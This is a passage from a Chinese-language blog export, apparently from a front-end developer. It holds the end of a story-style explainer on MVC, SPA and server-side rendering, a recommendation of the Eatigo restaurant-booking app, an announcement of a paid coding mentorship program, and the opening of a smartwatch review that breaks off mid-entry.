B。</p><p>這就是我所說的狀態管理變複雜了，有些地方需要花點心思做處理。在以往 MPA 的時候完全不會發生這種事，你可以保證 Server 會回傳正確的結果，因為畫面是在後端 render 再回傳回來的，而且每一個頁面之間的狀態不會互相干擾。</p><p>如果寫得好，我相信 SPA 的使用者體驗一定很不錯，因為用起來就跟你在用 Native App 差不多嘛，但你必須付出的代價是前端變得超級複雜，有一堆非同步的問題要考慮還有一大堆事情要做。此時的前端複雜度已經跟我們最開頭示範的那種簡單留言板相差許多了。</p><p>在這種時候，前端也可以參考我們前面所說的 MVC 架構或是其他相關架構來讓程式碼的職責變得更分明，讓整個專案更好維護。所以你可以又有 MVC 又有 SPA，或是沒有 MVC 但有 SPA，這兩者是完全不同的概念。</p><p>我之前寫過另外一篇文章，有興趣的話可以參考看看：<a href="https://blog.techbridge.cc/2017/09/16/frontend-backend-mvc/">前後端分離與 SPA</a></p><p>最後我舉一個一定要用 SPA 的例子：音樂播放網站。</p><p>如果音樂播放網站是用 MPA 的話，每去一個新的網址就會把整個頁面換掉，那你的網頁播放器就會中斷了，這是完全沒辦法接受的事。所以唯一的解法就是：播放器永遠都在頁面上，只有其他部分的內容換掉。而這一切都是在前端用 JavaScript 來處理的。</p><h3 id="第四幕：行銷團隊的暴怒"><a href="#第四幕：行銷團隊的暴怒" class="headerlink" title="第四幕：行銷團隊的暴怒"></a>第四幕：行銷團隊的暴怒</h3><p>小明花了整整一個月的時間不眠不休不吃不喝（誇飾法，開玩笑的），終於把整個網站改造成 SPA，而且還優化了不少地方，讓整個使用者體驗變得非常非常好。</p><p>不久過後，這個留言板系統因為體驗實在是太好了，有越來越多人使用，短短一個月內就有了一百萬個來自世界各地的使用者註冊。還有來自國外的使用者甚至寫信給小明希望能夠付錢來擁有更多功能：</p><blockquote><p>Hey, thanks for building such a cool website, I really like it. Is there any premium plan? I am glad to pay for the additional features like custom domain or custom template.</p></blockquote><p>聽過一大堆創業講座的小明知道時候到了，可以把這個 side project 當作創業項目了！</p><p>憑著現有的成績，小明很快地就募到了天使輪，找了幾個夥伴成立了一間公司，想要把這個留言板系統做成全世界第一的留言板，期許自己能成為留言板界的 WordPress。</p><p>可是好景不常，過了一兩個月之後不知道為什麼，新的會員越來越少，砸下大筆的廣告費也只帶來短暫的成效而已，一旦廣告停了就又恢復以往冷清的樣子。</p><p>奇怪，就算是熱潮退燒也沒退燒得這麼快才對，到底是發生什麼事呢？</p><p>一個禮拜過後，專長是數位行銷的合夥人氣噗噗的跑到小明的位子前，口氣很差地質問他：</p><blockquote><p>你做了什麼？為什麼在搜尋引擎上面搜尋我們的網站，結果只會出現一大堆看不懂的程式碼？我們的網站 SEO 做的奇差無比你知道嗎？</p></blockquote><p>小明一開始覺得很委屈，他什麼都沒做，怎麼會落得如此下場。但經過左思右想之後，終於發現了癥結點：SPA。</p><p>由於 SPA 是由前端的 JavaScript 動態產生內容，因此如果你對 SPA 的網站按下右鍵 -&gt; 檢視原始碼，只會看到空蕩蕩的一片，只看得到一個 JavaScript 檔案跟一些最基本的 tag。</p><p>內容在哪裡？不在這裡，因為那是由 JavaScript 動態產生的。只有你的網站經由瀏覽器載入並且執行 JavaScript，等 Response 回來之後才會動態產生出內容。因此無論是哪個頁面，你檢視原始碼都看不到動態新增後的內容。</p><p>慘了，這可是天大的壞消息。</p><p>但其實也沒有那麼壞，因為強大的 Google 的爬蟲其實支援執行 JavaScript，所以他依然會 index 你在前端渲染之後的頁面。</p><p>不過還是有兩個問題，第一個是我們不知道 Google 如何執行，會不會前端還沒完全渲染完就已經爬完了？第二個是除了 Google，還有其他很多搜尋引擎，有些可能沒有像 Google 這麼強大，碰到 SPA 就只能索引空蕩蕩的 HTML，內容幾乎空白。</p><p>該怎麼辦呢？</p><p>苦惱的小明跟公司請了長假，再度跑到十分瀑布下面修行，希望能夠重演當年想出 MVC 架構的劇本。很幸運地，過了三天之後，小明終於想到解法了，大喊了一聲：</p><blockquote><p>幹我知道了！</p></blockquote><p>小明的想法是這樣的，既然問題出在「第一次渲染」，那我們只要在第一次渲染的時候把該輸出的資料都輸出就好啦，對使用者來說還是一個 SPA，差別在於使用者接收到 HTML 的時候，就已經有完整的資料了。</p><p>舉例來說，假設使用者拜訪顯示所有留言的頁面，我在 Server Side 先把所有留言都準備好然後 render 出來，這樣使用者一收到 Response 的時候就能夠看到所有留言，搜尋引擎也能順利地爬到。</p><p>而後續的操作還是由 JavaScript 來處理，依舊能保持 SPA 的優點。或者我們能用一句話來總結：</p><blockquote><p>第一個頁面由 Server side render，之後的操作還是由 Client side render</p></blockquote><p>沒錯，這個概念就叫做 SSR，Server Side Rendering。</p><p><img src="/img/introduction-mvc-spa-and-ssr-545c941669e9/1__4BFpYiH__sah6HMzby28YIA.png"></p><p>有了 SSR 以後，就解決了 SEO 的問題，對網路爬蟲來說你有沒有用 SPA 都無所謂，他所抓到的內容都是一樣的。可是對使用者來說，一樣能享受到 SPA 所帶來的好處（不用換頁）。</p><p>雖然我在這邊只用幾句話帶過去，看起來輕鬆寫意，但真的實作過的話你就會發現這不是一件容易的事，有很多細節要去考慮。總之呢，小明花了整整兩個月的時間才把整個網站都改成 SSR。</p><p>不久後，在每個月的員工大會（新創嘛，一個月一次很合理）中 CMO 很開心地跟大家宣布產品在搜尋引擎上面的排名越來越高，自然流量也越來越多，註冊會員比起上個月增長了 200%。</p><p>CMO 很開心，搜尋引擎很開心，員工很開心，小明當然也很開心。</p><p>一天又平安的過去了，感謝飛天小明警的努力。</p><h3 id="最終幕：前端的未來"><a href="#最終幕：前端的未來" class="headerlink" title="最終幕：前端的未來"></a>最終幕：前端的未來</h3><p>因為科技進步快速加上網路的普及，世界變動的比以前快很多。</p><p>十年前手機還只是讓你打電話以及斤斤計較簡訊字數的工具，十年後就變成人手一台，不可或缺的小型電腦。</p><p>身為經歷過這一切的人，小明在深夜裡邊刷著 leetcode 邊回憶起前端的發展，遙想十年前他以為 HTML 跟 CSS 才是主角，JavaScript 只是阻止使用者點右鍵或是做出會跟著鼠標移動的酷炫跑馬燈的小玩具。</p><p>可是一切發展的越來越快，jQuery 的出現一統江湖，解決了惱人的跨瀏覽器問題，CSS 也因為預處理器的出現而變得更好維護，可以用更程式化的角度來撰寫。再過個兩三年，大家都不談 jQuery 了，而是談 Angular。可是又過了幾年，最潮的名詞變成 React，到現在 React 也沒那麼潮了，要潮的話請去寫 Vue。</p><p>更別提 SPA 的遍地開花以及 SSR 的出現，更是將前端的複雜度提升了不只一個檔次。有了 SSR 你就不再只是前端了，畢竟 SSR 的 S 可是 Server 的意思，還必須要會一點 Server side 的技術才行。</p><p>在 Mobile 的流量漸漸超越 Desktop 之後，前端的目標就邁向「可以逼近 Native App」的體驗。又像是個 App 可是又不用安裝，那該有多好，省了安裝這個步驟轉換率大幅提升，使用者開心公司也開心。</p><p>於是大家開始提倡 PWA，Progressive Web App。Web 不再單純只是 Web，而是要用起來像個 App，看起來也像個 App。甚至利用 Service Worker 搭配快取，在沒有網路時也能夠使用部分功能，也可以用 Skeleton 先把畫面的骨架顯示出來。</p><p>這一切的一切都為了一個目的：增進使用者體驗。</p><p>前端複雜歸複雜，但身為真心喜愛前端的人，小明可是對未來充滿了希望。一想到能夠接觸更多新的技術，更多新的解法，可以打造出更好的產品，小明內心湧起的情緒不是挫折而是興奮，無比的興奮。</p><p>東方的太陽緩緩升起，散射出的光芒灑在小明的房裡，提醒著他新的一天即將開始。</p><h3 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h3><p>對我來說，一個技術的出現絕對是有其理由的。而不是簡單一句：「前端現在就是這麼複雜」，我認為只要能理解他出現的脈絡，就能更輕易的從宏觀的角度去理解這項技術。</p><p>我們可以用三個問題來幫助自己理解一項事物：</p><ol><li>為什麼要有 XXX？</li><li>沒有 XXX 跟有 XXX 的區別是什麼？</li><li>所以 XXX 是什麼？</li></ol><p>MVC 就是因為 code 變得越來越亂，所以將職責區分清楚的一種設計模式。SPA 就是因為想增進使用者體驗，而出現的一種在前端利用 Ajax 達成不換頁的方法。SSR 就是因為要解決 SPA 的 SEO 問題而出現的解法。</p><p>一切都是有理由的，一切都是有原因的。你可以不懂它怎麼實作，但你一定要懂它是為了什麼而生。程式是工具，工具的目的是解決問題，重要的不是工具本身，而是背後要解決的那個問題。</p><p>感謝大家的閱讀，如果有任何錯誤麻煩不吝指出。另外，此篇文章只希望能給出一個大方向，對於細節如果要討論的話其實每個細節都可以再寫一篇專文，例如說 MVC 到底是在講哪個 MVC？SPA 在 Google 上的 SEO 真的比較差嗎？SSR 在首次加載頁面上犧牲的時間（因為要等 API 的資料回來才能 render）與增進 SEO 之間的取捨等等。</p><p>喜歡的話可以拍個手，你知道 Medium 最多可以拍 50 下嗎？可以根據你的喜好程度拍不同次數的手，想要拍好拍滿的話我也是樂見其成。</p><p>最後，再次感謝你的閱讀。</p><p>想持續關注的話可以 follow 一下。單純手癢想按按鈕也可以按個 follow，或是考慮一下關注 <a href="https://www.facebook.com/lidemytw/">Lidemy 粉絲專頁</a>。</p><p>想看更多文章可以參考我的 Medium 文章列表：<a href="https://aszx87410.github.io/blog/medium">https://aszx87410.github.io/blog/medium</a></p>]]></content>
      
      
      <categories>
          
          <category> 技術白話文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技術白話文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>東南亞吃飯省錢必備神器：Eatigo</title>
      <link href="/2018/03/01/eatigo-128375a0caf/"/>
      <url>/2018/03/01/eatigo-128375a0caf/</url>
      
        <content type="html"><![CDATA[<p>備註：2018 年寫這篇的時候我在這間公司工作，但這不是業配文，我公司沒叫我寫（怎麼會叫一個工程師寫這個），我寫了也不會有錢拿。寫這篇純粹是想跟大家推薦這個服務。</p><p>先用一句話來總結 Eatigo 到底是個什麼東西：</p><blockquote><p>Eatigo 是餐廳訂位平台，只要在上面訂位，去餐廳吃飯時就能享有折扣（10%~50%）</p></blockquote><p>就是那麼簡單。</p><p>我一開始懶得跟我朋友解釋，都直接用「東南亞版 <a href="https://tw.eztable.com/">EZTABLE</a>」來帶過，但其實不是。我們公司的差別就在於你<strong>不用買餐券</strong>、<strong>不用先付費</strong>，你唯一要做的就是<strong>訂位</strong>，結帳時就會自動有折扣。</p><p>聽起來很棒吧？因為真的很棒。</p><p>讓我們直接來看一下 Android App 的截圖：</p><p><img src="/img/eatigo-128375a0caf/1__CPK1MFaP2rgeZ1sn49jYnw.png"></p><p>在餐廳列表裡面，你可以很快地看到優惠的時間跟折扣，不過你應該很快就會發現優惠越高的時段都越冷門。</p><p>沒錯，天下沒有白吃的午餐，沒有那種你十二點去吃還讓你打對折的事情，這樣你叫其他客人情何以堪（其實也是有，但很少）。</p><p>在 Eatigo 上面如果你想要折扣高一點的話，都是一些比較冷門的時段，例如說兩點吃午餐、五點吃晚餐、九點吃晚餐之類的。但是為了省錢，調整一下用餐時間其實也值得。</p><p>而且若是你用心找，會發現有些餐廳其實連十二點、六點這種很正常的時段也都有折扣，不過這取決於餐廳的熱門程度而定。</p><p><img src="/img/eatigo-128375a0caf/1__6Qs4SmivqmIzVC4f74wrMg.png"></p><p>點進去餐廳之後，你可以看到這間餐廳各個時段的優惠，請記住優惠跟人數是有關聯的，這邊看到的是兩個人的優惠，如果你人很多的話，記得調整人數之後再來看優惠。</p><p>以這間來說，八點吃飯七折，九點吃飯五折，其實都是很不錯的優惠。</p><p>就這樣，沒有其他我想要介紹的了。簡單來說它就跟其他餐廳訂位 App 長得差不多，你可以搜尋餐廳、瀏覽餐廳分類、依地點尋找餐廳等等，但最大的差別就在於你只要在上面訂位，就能夠有優惠。</p><p>不過有一點例外啦，那就是飲料不包含在裡面。只有飲料而已，其他的東西都享有折扣。</p><p>有些人可能會擔心透過這邊訂位的話，去吃飯份量會不會比較少，不然怎麼那麼便宜。這個擔心很合理，我以前用 GOMAJI 的時候也這樣想。</p><p>但其實不用擔心這個，第一是因為 Eatigo 上面一堆餐廳都是吃到飽的 buffet，第二是因為你去餐廳吃飯的時候不會有特別的菜單。再次重申，Eatigo 不是團購券也不是餐券，你跟路人的差別只有：</p><ol><li>你在 Eatigo 上面先訂好位，而路人沒有</li><li>你有折扣，而路人沒有</li></ol><p>Eatigo 目前在新加坡、曼谷、清邁、吉隆坡、馬尼拉、孟買、香港都有服務，很遺憾地，台灣還沒有QQ</p><p>在 Google Play 跟 App Store 上面都下載的到 App，你直接搜尋 Eatigo 就好，也有<a href="https://eatigo.com/">網頁版</a>可以使用。</p><p>誠心推薦給要去東南亞旅遊，或是像我一樣在 Eatigo 有支援的國家（新加坡）居住的朋友們。我用過兩次，兩次都是打對折，體驗還滿不錯的。</p><p>就是這樣，大家下次如果去東南亞想要吃的比較好一點又想要省錢的話，歡迎試試看 Eatigo！</p><p>最後，附上一張我上禮拜吃的牛排，是一間飯店附設的餐廳。原價 800 台幣，六點去吃晚餐打對折變成 400 台幣，真的划算。</p><p><img src="/img/eatigo-128375a0caf/1__aRsLt1NFU4U3Wwt6oPce2w.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 科技 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科技 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>從零到一：程式導師實驗計畫</title>
      <link href="/2017/12/21/mentor-program-b5f96ae1eed1/"/>
      <url>/2017/12/21/mentor-program-b5f96ae1eed1/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/mentor-program-b5f96ae1eed1/1__K7bBVfi4k9a7wUci__nCg__w.jpeg"></p><p>前幾天我在滑臉書的時候，看到了一個 UX Mentorship Program，覺得很有趣。其實我之前也有想過類似的東西，但始終沒有付諸行動，這次趁著熱度還在，下定決心要來弄一個程式版的導師計畫。</p><p>在開始介紹這個計畫之前，先來簡單介紹一下我自己。</p><p>寫程式寫了十年，工作經驗約兩年半，實習的時候寫過 PHP、Corona SDK，第一份工作寫過 Android、Node.js，之後的兩份工作都是專職前端。</p><p>目前在新加坡工作，職稱是資深前端工程師。如果你想知道更多，可以直接參考我的 <a href="https://www.linkedin.com/in/hulii/">Linkedin</a>。如果想看我做過的作品，基本上公開的只有一個，其他都是一些內部系統，可以<a href="https://garena.live/">到這裡</a>。</p><p>你問我哪部分是我做的嗎？全部。<br>（其實是我接手上一個同事的，但是後來有大改版，所以看到的基本上都是出自我手。不過我離職之後有新的同事來接，所以有部分功能例如說排行榜之類的是我同事寫的）</p><p>喜歡分享，也喜歡教學，寫過最多人看的程式相關文章應該是這篇：<a href="http://huli.logdown.com/posts/703835-experience-ten-year-programming-of-self-study-road">十年程式自學之路</a></p><p>教學部份的話，在 Hahow 上面有一門付費線上課程：<a href="https://hahow.in/cr/cs-the-easy-way">初心者的計概與 coding 火球術</a>，課程宗旨是把計算機概論講得更簡單，幫初學者打基礎。</p><p>免費課程有開過兩堂，在我自己的課程平台 <a href="https://lidemy.teachable.com/">Lidemy</a> 上面。第一個是<a href="https://lidemy.teachable.com/courses/enrolled/185961">從新手到中手：前端工程加強班</a> ，藉由不斷增加新功能的作業來提升前端技術。</p><p>第二個是<a href="https://lidemy.teachable.com/courses/enrolled/192307">導讀哈佛大學程式課程：CS50</a>。幫一堂我很推崇的課做導讀，我也創辦了相關的中文討論區社團，並且持續推廣這堂課，之前還自己跳下來做導讀，希望能多少降低一些入門門檻。</p><p>關於上面這些教學，我有寫了兩篇心得：<a href="http://huli.logdown.com/posts/1913623-frontend-tutorial-experiment">一場三十人的免費程式教學實驗：成果與檢討</a>以及 <a href="http://huli.logdown.com/posts/1971256-lidemy-online-programming-course-platform-for-the-beginner">Lidemy 鋰學院：為初學者而生的線上程式課程平台</a>。</p><p>除了線上課程，我還喜歡寫一些技術教學文章（類型偏向前端），例如說：</p><ol><li><a href="http://blog.techbridge.cc/2017/03/24/difficult-problem-of-cookie/">我遇過的最難的 Cookie 問題</a></li><li><a href="http://blog.techbridge.cc/2017/09/16/frontend-backend-mvc/">前後端分離與 SPA</a></li><li><a href="http://blog.techbridge.cc/2017/07/15/javascript-event-propagation/">DOM 的事件傳遞機制：捕獲與冒泡</a></li><li><a href="http://blog.techbridge.cc/2017/06/17/cache-introduction/">循序漸進理解 HTTP Cache 機制</a></li><li><a href="http://blog.techbridge.cc/2017/05/20/api-ajax-cors-and-jsonp/">輕鬆理解 Ajax 與跨來源請求</a></li><li><a href="http://blog.techbridge.cc/2017/04/22/javascript-prototype/">該來理解 JavaScript 的原型鍊了</a></li><li><a href="http://blog.techbridge.cc/2017/02/25/csrf-introduction/">讓我們來談談 CSRF</a></li></ol><p>以上列舉幾篇我覺得寫得比較不錯的，如果想看更多的話，可以到<a href="http://huli.logdown.com/archives">我的部落格</a>或是參考我去年參加鐵人賽的主題：<a href="https://ithelp.ithome.com.tw/users/20091346/ironman/1150">Half-Stack Developer 養成計畫</a>。</p><p>最後則是喜歡紀錄一些自己的故事，例如說<a href="/2017/10/21/stripe-and-i-df35a6f0a799/">我與 Stripe ：一段愛與夢想的故事</a>跟<a href="/2017/10/09/resume-evolution-4c337ff30729/">一個工程師的履歷進化史</a>。如果你想更瞭解我的背景，可以直接參考這系列文章：<a href="/2017/10/05/the-programming-journey-1-b9b19c0ef05b/">自學、哲學、講學：我的程式之路（上）</a></p><p>從上面零零總總應該就能看得出來，我是個很喜歡分享跟教學的人，但其實我最想做的事情，卻一直沒能做到。</p><blockquote><p>我想把一個毫無基礎的人，帶到能成為軟體工程師並且找到工作。</p></blockquote><p>這是我最最最想做的事。我之前所做的那些教學，某種程度上都是為了這個目標而鋪路。</p><p>但我做不做得到？我不知道。</p><p>我覺得我可以，但也有可能是我自我感覺良好，搞不好我教學能力根本奇差無比，講解都越講越難懂。</p><p>這也是為什麼我在標題放上「實驗」兩個字，因為這個就是一場實驗沒錯，實驗我有沒有這個能力，而實驗品就是想報名的你。</p><p>好，接著可以來介紹一下這個計畫到底是什麼了。</p><h3 id="計畫詳情"><a href="#計畫詳情" class="headerlink" title="計畫詳情"></a>計畫詳情</h3><p>這個計畫很簡單，目標就是：</p><blockquote><p>四個月內，把你培養成一個找得到工作的網頁工程師（前端或後端）</p></blockquote><p>那實際上怎麼做呢？之前我有寫了一份學習計畫，是希望給那些沒有方向的初學者參考用的，這次課程基本上會照著這個走（大致上一樣，但會有些小幅修正）：<a href="https://hackmd.io/s/H1L4FEb5Z">教學實驗計畫 - HackMD</a></p><p>不過如果你想走前端的話，前端會多教一些東西，例如說 React 之類的。總之呢會教的東西就是基本的前端後端，搭配一些基礎程式能力培養（避免你連雙層迴圈或是字串反轉都寫不出來）</p><p>因為我一直很強調自學的人需要作品集這件事情，所以最後也會讓你有一個作品，例如說留言板、部落格或是論壇等等。但除此之外，你最好能夠在結束之後自己再做一個，因為自己做跟有人帶著做是完全不同的兩件事。</p><h3 id="教學方式"><a href="#教學方式" class="headerlink" title="教學方式"></a>教學方式</h3><p>在一開始，基礎的東西都會由我自己帶。例如說基本 HTML、CSS、JavaScript 或是 PHP 等等。但我只帶基本的，所以更進階的要由你們自學，因為自學能力也是很重要的，我不想你成為一個只會聽課不會自己學習的人。</p><p>前端就是以基本的 HTML、CSS、JavaScript、jQuery 為主，如果你想走前端的話可能會再加上個 React。</p><p>後端的話會以 PHP 為主，有時間的話會帶大家玩一下 Node.js，無論你以後工作想找前端還是後端，我們兩種都會上到，差別在於深淺而已，對於想找後端工作的人應該會上個 Laravel。</p><p>自學的資源基本上就是網路上的一些免費資源，但因為網路上的資源都滿零碎的，所以很有可能你會碰到許多問題，這時候怎麼辦呢？問我就對了！</p><p>有老師的好處就是你碰到問題可以直接問，我會講到你聽懂為止。或者是每一個階段結束之後，我會幫大家重新整理這一個階段學到的東西，會讓你對這東西有更深一層的認識。</p><p>如果到某一個主題大家自學都學不通，那我還是會跳下來親自教學。</p><p>由於這是一個要把你從零帶到找得到工作的計畫，所以會要求你必須付出一定的時間，其實基本上就是每週四十小時啦。但如果你現在還有工作，願意每天下班以及假日練習的話，也是 ok 的。想要得到怎樣的成果就要付出多少的努力，就算我教得再好，你抽不出時間來也是枉然。</p><p>所以基本的流程就是：</p><ol><li>白天你自己做作業，找資料練習（因為我在上班 QQ）</li><li>白天有問題也可以問，但我可能要晚上才能回答</li><li>晚上是統一回答問題時間或是上課時間，但不會每天都上課，大概兩三天一次</li></ol><p>上課方式就是 video call，然後有問題都可以直接問。所以這整個計畫，可以想像成是一個密集的小班教學。</p><p>目前預計只收 5 人，再多人我應該就負荷不來了，但實際人數會根據狀況調整。</p><p>如果 ok 的話，有可能會偶爾會想辦個實體聚會，畢竟收進來的人其實就算是同學了，希望能讓大家認識一下（但如果你不想參加也可以，不強制），所以地點在台北為佳啦，但大部份時間是線上活動，所以你住在哪裡其實都可以。</p><h3 id="收費方式"><a href="#收費方式" class="headerlink" title="收費方式"></a>收費方式</h3><p>通知錄取並且答應上課之後，先付 <strong>10000 新台幣</strong>保證金。在開課後的 30 天內可無條件退款（例如說覺得老師比想像中弱，或是老師教很爛之類的），超過 30 天之後就不能退了。</p><p>四個月結業之後，你必須在<strong>兩個月</strong>內積極找工作，如果找不到工作，就代表我教學失敗、實驗失敗。都說了是實驗，如果失敗了我就認為不應該收你錢，我會把 10000 新台幣退給你。</p><p>但如果你成功找到工作了，學費總額會是<strong>一個月的薪水</strong>（如果有經濟困難可分期付款）。例如說你找到月薪 35000 的工作，學費就是 35000，扣掉之前給的保證金 10000，你還要再付給我 25000。（備註：詳細定義可參考下面補充的）</p><p>就是這麼簡單，兩個月內沒找到工作我退你全額，但如果有找到工作，學費總額就是一個月的薪水。</p><p>這邊稍微補充一下，拿到 offer 就算是有找到工作了，但去不去是你自己的決定。只要有拿到 offer，就表示你有這個實力，所以就算是這個實驗成功了，然後學費會以拿到的 offer 的最高價格為準。例如說你拿到三個 offer，40k, 38k, 35k，儘管你最後選擇去 35k 的那個，學費依然是 40k（代表你有拿到 40k 的實力，只是因為種種原因你去了其他的）</p><p>另外，你在找工作的那兩個月儘管已經結業了，我還是會全力給予協助，例如說你可以跟我討論面試時候被問到的問題、履歷該怎麼寫或者是讓我幫你模擬面試之類的，我會全力協助你求職。</p><h3 id="計畫時程表"><a href="#計畫時程表" class="headerlink" title="計畫時程表"></a>計畫時程表</h3><p>報名日期：即日起至 2018&#x2F;01&#x2F;05 晚上 11:59 分（五）<br>報名結果公告：2018&#x2F;01&#x2F;19（五）<br>開課日期：2018&#x2F;01&#x2F;29（一）<br>結業日期：2018&#x2F;05&#x2F;29（二）</p><h3 id="報名方式"><a href="#報名方式" class="headerlink" title="報名方式"></a>報名方式</h3><p>由於這個計畫滿認真的，所以我也希望找到比較認真的人，因此報名流程會稍微繁瑣一點。</p><ol><li><a href="https://goo.gl/forms/HAPsG8ry4em98vm72">填寫 Google 表單</a>（一些基本資料）</li><li>去研究什麼是 <a href="https://scratch.mit.edu/">Scratch</a>，並且做出一個小作品，只要是任何你覺得完整的作品就好，沒有 idea 的話可以參考 <a href="https://youtu.be/y62zj9ozPOM?t=50m21s">CS50</a>。這個只是想測驗你有基本的自學能力而已，所以不用做得太複雜（不用有關卡）。</li><li>寫信到：<a href="mailto:&#x61;&#x73;&#122;&#x78;&#x38;&#55;&#x34;&#49;&#x30;&#64;&#103;&#109;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#109;">&#x61;&#x73;&#122;&#x78;&#x38;&#55;&#x34;&#49;&#x30;&#64;&#103;&#109;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#109;</a><br>標題請打：[報名] 程式導師實驗計畫  — huli<br>（請把 huli 換成你自己的暱稱）</li></ol><p>信件內容麻煩附上：</p><ol><li>自我介紹</li><li>報名這個計畫的理由</li><li>可以為這個計畫付出的時間</li><li>Scratch 作品連結</li><li>做完 Scratch 作品的心得</li><li>任何你想跟我分享的東西（例如說你寫的小說、你畫的圖、你以前的程式作品等等，任何你覺得會加到分的東西都可以。）</li></ol><p>收到信件之後我會回覆一個罐頭回信，讓你知道我有收到了。<strong>請記得，Google 表單填完跟寄信之後才算是報名成功，兩者缺一不可。</strong></p><p>如果報名的人太多太難篩選的話可能會再安排時間用 skype 或其他視訊軟體進行面試。報名結果公告那天（2018&#x2F;01&#x2F;19），無論有沒有錄取你都會收到信件，絕對不會有無聲卡的情形發生。</p><p>總而言之，我會讓你知道我收到報名信了，也會讓你知道你有沒有錄取。（但是沒錄取的通知信有可能是罐頭信件就是了，不好意思）</p><h3 id="注意事項"><a href="#注意事項" class="headerlink" title="注意事項"></a>注意事項</h3><p>因為標題就開門見山說了這是一個實驗計畫，所以實驗目標到底會不會成功，我真的沒有百分之百的把握。</p><p>我是個誠實的人，我只敢保證我真的確定能做的事，所以為了不讓你吃虧，我提供了自認為還不錯的條件（30 天內全額退費、比外界低廉的學費、沒就業就退費）來彌補。</p><p>對你來說，報名這個計畫有三種可能：</p><ol><li>老師很爛教得很差 -&gt; 開課 30 天內退費 -&gt; 損失時間但沒損失錢</li><li>老師教得不錯 -&gt; 可是結業後找不到工作 -&gt; 損失時間但沒損失錢</li><li>老師教得很棒 -&gt; 找到工作 -&gt; 用一個月的薪水換到一份新工作</li></ol><p>另外，我不會強調每一個人都一定要當軟體工程師，或者是什麼寫程式是之後的未來趨勢。我又不是未來人，我怎麼知道未來趨勢是什麼。而且每個人都有自己的興趣，如果你寫一寫發現自己真的不適合，我也不會強迫你。</p><h3 id="One-more-thing"><a href="#One-more-thing" class="headerlink" title="One more thing"></a>One more thing</h3><p>因為不確定到底一週能拿出 40 小時的人到底有多少，所以為了避免沒人報名的窘境，我其實還可以提供另外一種型態的導師服務。</p><p>上面所講的那種，是以成為軟體工程師為目標，但可能有很多人只是想學程式技能卻不想轉職，針對這種人，我能做的事情就是：</p><blockquote><p>依照你的目標制定學習計畫</p></blockquote><p>例如說你的目標可能是自己寫一個部落格網站、架個人網站、架一頁式金流網站、想要了解工程師到底在幹嘛等等，針對這種不同需求，也可以提供專屬的導師計畫，教學方式一樣是不斷回答問題跟直接上課幫你解惑。</p><p>時程跟報名方式都跟上面一樣，差別在於收費。因為這個沒有想要找工作，所以收費標準就沒辦法用薪水來衡量，於是我決定統一收費 <strong>15000 台幣</strong>，開課的時候就必須先付，然後 30 天內一樣無條件退費。</p><p>（補充：因為有些人提問，再次強調業餘班的報名方式跟時程都跟原本的班級一模一樣，<strong>唯一的差別只有填寫 Google 表單時的選項選的是業餘班</strong>，就這樣而已，所以麻煩一樣按照上面的流程報名，感謝）</p><p>這類的班級我稱作「業餘班」，就不會這麼密集的上課，但還是會回答問題，可能一週只要拿出 10 小時左右就 ok 了。而課程也不會像上面那麼完整，會比較零碎而且針對一點。</p><p>不過我要特別聲明，如果你想做出那種很炫很華麗很漂亮的網頁，那種我真的不會，拜託你不要報名，你只會失望而已。我能教的類型比較偏向工程類而不是設計類。</p><p>最後，如果報名全職班的人出乎意料多的話，那這個業餘班就不一定會開成，因為我前面講了，我的終極目標是想要從零帶出一個工程師，所以會以這個目標為優先，先跟大家說聲不好意思。</p><p>就是這樣了，希望我有把該說的都說清楚，如果有任何疑問，可以寫信到我的信箱（上面有地址），或者是直接在下面留言，感謝。</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>很抱歉，但你們都不夠好— — 四款智慧型手錶使用心得</title>
      <link href="/2017/11/29/smartwatch-review-55dac978bbf5/"/>
      <url>/2017/11/29/smartwatch-review-55dac978bbf5/</url>
      
        <content type="html"><![CDATA[<p>我以前不是一個喜歡戴手錶的人。</p><p>小時候戴過一陣子，但自從手機盛行之後，就都改用手機來看時間了。唯一會戴手錶的時候只有考試而已，用來看還有多少時間可以把題目寫完。</p><p>第一次長期戴手錶是在當兵的時候，進去之前就查了很多資料，發現大家都很推薦要帶手錶，畢竟在裡面很注重時間管理。也因為從那時候養成了戴手錶的習慣，導致退伍之後不戴手錶覺得很不習慣。</p><p>那時候是 2015 年 3 月，連 Apple Watch 都還沒出來（快要推出了）。我原本以為智慧型手錶很貴（一萬以上），所以一直觀望不敢入手，直到我有天看到 PChome 在賣 ASUS 的 ZenWatch，發現才 6000 塊而已，我心裡就想說：我的 Zenfone 加上 ZenWatch 不過才一萬出頭，比買 iPhone 便宜多了！</p><p>抱持著這個想法，我就入手了我人生中第一隻智慧型手錶。</p><h3 id="初試啼聲：ASUS-ZenWatch"><a href="#初試啼聲：ASUS-ZenWatch" class="headerlink" title="初試啼聲：ASUS ZenWatch"></a>初試啼聲：ASUS ZenWatch</h3><p><img src="/img/smartwatch-review-55dac978bbf5/1__v4w__CqTLY2A851____WJZMzw.jpeg"></p><p>而這隻手錶也是我至今最喜歡的一隻。</p><p>那時候很多朋友看我戴這隻手錶，都會問我說：「這隻手錶到底能幹嘛？」</p><p>有些人會覺得智慧型手錶根本沒屁用，因為必須跟手機連線，既然手機是必備的，那幹嘛還要手錶？手錶又不能取代手機。</p><p>對我來說，手錶是「不可能」取代手機的，而且也沒有必要取代手機。依我看來，可以簡單地把智慧型手錶分成兩類：功能類跟運動健康類。</p><h3 id="功能類"><a href="#功能類" class="headerlink" title="功能類"></a>功能類</h3><p>這一類型的手錶應該提供的功能有以下幾點：</p><ol><li>查看行事曆</li><li>查看手機上的通知</li><li>查看訊息、郵件甚至是快速回覆</li><li>查看天氣</li></ol><p>對我來說，只要能達成以上幾點，就能夠算是一隻不錯的智慧型手錶了。但如果還想要更好的話，應該要有：</p><ol><li>NFC</li><li>語音辨識轉文字輸入</li><li>手錶跟手機斷線時會有通知（可以防止手機遺失）</li></ol><h3 id="運動健康類"><a href="#運動健康類" class="headerlink" 